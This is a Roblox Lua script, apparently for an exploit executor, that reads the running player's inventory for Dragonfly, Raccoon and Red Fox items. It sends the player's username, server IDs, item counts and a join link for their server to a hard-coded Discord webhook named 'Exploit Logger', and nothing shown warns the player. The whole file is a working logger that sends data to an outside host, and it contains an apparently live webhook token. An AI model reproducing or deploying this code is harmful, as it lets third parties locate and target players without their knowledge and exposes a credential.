local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local backpack = LocalPlayer:WaitForChild("Backpack")

local webhookUrl = "https://discord.com/api/webhooks/1374728692663849100/y25fQk-wOS3fkR4r4fL5XjFA-C-YMDrvGeqC-dPKwWhc6RnKYbB57VnrR294YcNnbBvA"

local counts = {Dragonfly = 0, Raccoon = 0, ["Red Fox"] = 0}

for _, item in ipairs(backpack:GetChildren()) do
    if item:IsA("Tool") and item.Name then
        local name = string.lower(item.Name)
        if string.find(name, "dragonfly") then
            counts.Dragonfly = counts.Dragonfly + 1
        elseif string.find(name, "raccoon") then
            counts.Raccoon = counts.Raccoon + 1
        elseif string.find(name, "red fox") then
            counts["Red Fox"] = counts["Red Fox"] + 1
        end
    end
end

local placeId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)
local joinLink = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..jobId
local generatedAt = os.date("%Y-%m-%d %H:%M:%S")

local inventoryText = 
    "**Red Fox:** "..counts["Red Fox"].."\n"..
    "**Raccoon:** "..counts.Raccoon.."\n"..
    "**Dragonfly:** "..counts.Dragonfly

local data = {
    username = "Exploit Logger",
    embeds = {{
        title = "Exploit Script Executed",
        color = 3447003,
        fields = {
            {name = "Username", value = LocalPlayer.Name, inline = true},
            {name = "Place ID", value = placeId, inline = true},
            {name = "Job ID", value = jobId, inline = false},
            {name = "Inventory Counts", value = inventoryText, inline = false},
            {name = "Join Server", value = "[Click to Join Game Instance]("..joinLink..")", inline = false},
            {name = "Generated at", value = generatedAt, inline = false},
        }
    }}
}

local body = HttpService:JSONEncode(data)

local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request or (fluxus and fluxus.request)
if not requestFunc then
    warn("No HTTP request function found")
    return
end

local success, err = pcall(function()
    requestFunc({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = body
    })
end)

if not success then
    warn("Failed to send webhook: "..tostring(err))
end
